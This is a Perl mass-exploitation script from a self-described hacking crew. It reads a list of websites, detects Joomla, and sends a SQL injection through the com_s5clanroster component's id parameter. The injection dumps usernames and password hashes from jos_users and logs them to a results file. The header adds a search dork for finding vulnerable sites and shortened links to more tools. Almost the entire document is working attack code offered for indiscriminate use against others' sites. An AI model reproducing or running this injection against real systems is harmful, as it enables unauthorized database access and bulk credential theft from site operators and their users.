##############################################################################################################
#                                  mandra crew memberZ   
#
######################
# Exploit Title :    joomla Com_s5clanroster Vulnerability
# Exploit Author :   el ZinDYanII-tN
# TargetS :          list.txt :p
# Tested on :        [ WIN 8.1 ]
# dork :             inurl:index.php?option=com_s5clanroster
# fb team page :     http://linkshrink.net/7vjXkA
# fb Author :        http://linkshrink.net/7ta538
# video Proof :      http://linkshrink.net/7ZSPhq
# More Exploit :     http://linkshrink.net/7JlAtX
# team :             mandra crew memberZ 
# Date:              16/10/2017
######################
# Music :            Rob Gasser & Laura Brehm - Vertigo [NCS Release]
# Discovered by :    el ZinDYanII-tN
# Greetz :           [ Spawn_Z | SerialBack  | pedro vortex | adminet ]
######################
######################
# DOWNLOAD TOOL :    http://linkshrink.net/7JlAtX
##############################################################################################################
use IO::Select;
use HTTP::Response;
use HTTP::Request::Common qw(GET);
use URI::URL;
use IO::Socket::INET;
use Term::ANSIColor qw(:constants);
use MIME::Base64;
use LWP;
use HTTP::Cookies;
use HTML::Entities;
use URI::Escape;
use Win32::Console::ANSI;
use Term::ANSIColor;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
use LWP::UserAgent;
use HTTP::Request::Common;
use Term::ANSIColor;
use HTTP::Request::Common qw(GET);
$ag = LWP::UserAgent->new();
use MIME::Base64;
my $time    = localtime;
    $res="result";
    if (-e $res)
    {
    }
    else
    {
        mkdir $res or die "WE CAN NOT CREATE THE BOARD OF DIRECTORS: $res";
    }
	    print color('reset');
	system ("title mandra crew web-fucker V2.1");
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
print colored ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++",'black on_red'),"\n";print color('reset');
print colored ("                       [ c0d3d bY ManDra creW membere ]                        ",'white on_red'),"\n";print color('reset');
print colored ("                               [ elZinDYanII-tN ]                              ",'white on_red'),"\n";print color('reset');
print colored ("                              [ Version 2.1 baby ]                             ",'white on_red'),"\n";print color('reset');
print colored ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++",'black on_red'),"\n";	print color('reset');									
print colored ("\n                     ___ ___ _____ _______ __          __                    ",'green on_black'),"\n";print color('reset');
print colored ("                    |   Y   | _   |   _   |  |--.-----|  |_                    ",'green on_black'),"\n";print color('reset');
print colored ("                    |.      |.|   |___|   |  _  |  _  |   _|                   ",'green on_black'),"\n";print color('reset');
print colored ("                    |. |_|  `-|.  |_(__   |_____|_____|____|                   ",'green on_black'),"\n";print color('reset');
print colored ("                    |:  |   | |:  |:  1   |  mandra crew                       ",'green on_black'),"\n";print color('reset');
print colored ("                    |::.|:. | |::.|::.. . | joomla-fucker                      ",'green on_black'),"\n";print color('reset');
print colored ("                    `--- ---' `---`-------'Com_s5clanroster   (get password)   ",'green on_black'),"\n\n"; print color('reset');                           
print colored ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++",'black on_red'),"\n";print color('reset');
print colored ("                                  [ thnx f0r ]                                 ",'white on_red'),"\n";print color('reset');
print colored ("               [ Spawn_Z | SerialBack  | pedro vortex | adminet ]              ",'white on_red'),"\n";print color('reset');
print colored ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++",'black on_red'),"\n\n";print color('reset');
print colored ("                       Start At $time                                          ",'white on_black'),"\n";print color('reset');

print "\n\tPut Ur List Plz : ";
 $list=<STDIN>;
 print "\n\n";
 open(tarrget,"<$list") or die "\t\t List Not Found Bro ";
 while(<tarrget>){chomp($_);
 $site = $_;
 if($site !~ /https:\/\// && $site !~ /http:\/\// ) { $site = "http://$site/"; };
 cms($site);}
 sub cms($site){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (15);
my $jm = $ua->get("$site")->content;
if($jm =~/<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>| \/media\/system\/js\/|com_content|Joomla!/)
{               print "\n\n\n[+]";
                print color("bold yellow"), "[-Joomla-].......";
                print color('reset');
                print " $site\n\n";
com_s5clanroster($site);}
else{print "\n[-]................. $site";}
 }
 sub com_s5clanroster($site){      print color('green'),"\n[*]-[*]";print color('bold white'),"[Com s5clanroster get password ] ..... ";
$code="%27+/*!50000UnIoN*/+/*!50000SeLeCt*/+group_concat(username,0x3a,password),222+from+jos_users--%20-";
$agent = LWP::UserAgent->new() or die "[!] Error while processing";
$agent->agent('Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.12011');
$host= $site. "/index.php?option=com_s5clanroster&view=s5clanroster&layout=category&task=category&id=-null".$code;
$ok = $agent->request(HTTP::Request->new(GET=>$host));
$ok1 = $ok->content; if ($ok1 =~/([0-9a-fA-F]{32})/){
    print color('bold green');
    print  "[Sucess]";
    print color('reset');
print "\n[+] Password --> $1\n$2\n";
        open (TEXT, '>>result/Get_password.txt');
        print TEXT "[COM s5clanroster] ~~ $site ~ $1\n$2 $time\n";
        close (TEXT);
sleep 1;
}else{
    print color('bold red');
    print  "[Failed]";
    print color('reset');}}